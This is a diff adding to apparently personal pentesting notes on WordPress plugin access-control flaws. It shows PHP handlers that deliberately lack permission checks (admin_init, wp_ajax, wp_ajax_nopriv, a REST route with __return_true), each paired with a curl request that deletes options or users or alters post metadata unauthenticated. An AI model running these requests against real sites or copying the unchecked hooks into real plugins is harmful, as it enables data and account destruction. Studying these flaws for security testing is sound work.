@@ -3156,7 +3156,91 @@ curl [url]/?update=1&data=admin
 ```
 
 - The `admin_init` load functions hooked to it when an admin related function is loaded probably `/wp-admin/admin-ajax.php`.
-- 
+- Vulnerable code-:
+
+```php
+add_action("admin_init", "delete_admin_menu");
+
+function delete_admin_menu(){
+    if(isset($_POST["delete"])){
+        delete_option("custom_admin_menu");
+    }
+}
+```
+
+- To exploit this, the unauthenticated user just needs to perform a POST request to the admin-ajax.php and admin-post.php endpoints specifying the needed parameter to trigger the delete_option function to remove sensitive data.
+- Exploitation-:
+
+```bash
+curl [URL]/wp-admin/admin-ajax.php?action=hearbeat -d "delete=1"
+```
+
+- `wp_jax_${action}`
+- Vulnerable code-:
+
+```php
+add_action("wp_ajax_update_post_data", "update_post_data_2");
+
+function update_post_data_2(){
+    if(isset($_POST["update"])){
+        $post_id = get_post($_POST["id"]);
+        update_post_meta($post_id, "data", sanitize_text_field($_POST["data"]));
+    }
+}
+```
+
+- Call the `update_post_data` action with `admin-ajax.php` to access function `updata_post_meta` function to update arbitrary WP Post metadata.
+- Exploitation-:
+```bash
+curl [url]/wp-admin/admin-ajax.php?action=update_post_data&update=1 -d "id=1&data=nice"
+```
+
+- `wp_ajax_nopriv_${action}`
+- Vulnerable code-:The hook above allows an unauthenticated user to access the action
+
+```php
+add_action("wp_ajax_nopriv_toggle_menu_bar", "toggle_menu_bar");
+
+function toggle_menu_bar(){
+    if ($_POST["toggle"] === "1"){
+        update_option("custom_toggle", 1);
+    }
+    else{
+        update_option("custom_toggle", 0);
+    }
+}
+```
+- Exploiting it-:
+
+```bash
+curl [url]/wp-admin/admin-ajax.php?action=toggle_menu_bar -d "toggle=1"
+```
+
+- The `register_rest_route`
+- Sometimes, developers don’t implement a proper permission check on the custom REST API route and use the __return_true string as the permission callback. This makes the custom REST API route to be publicly accessible.Vulnerable code-:
+
+```php
+add_action( 'rest_api_init', function () {
+  register_rest_route( 'myplugin/v1', '/delete/author', array(
+    'methods' => 'POST',
+    'callback' => 'delete_author_user',
+    'permission_callback' => '__return_true',
+  ) );
+} );
+
+function delete_author_user($request){
+    $params = $request->get_params();
+    wp_delete_user(intval($params["user_id"]));
+}
+```
+
+- Any unauthenticated user can make a request to the endpoint `myplugin/v1/delete/author` which calls a function for deleting a user.
+
+```bash
+curl [url]/myplugin/v1/delete/author -d "user_id=0"
+```
+
+
 
 
 
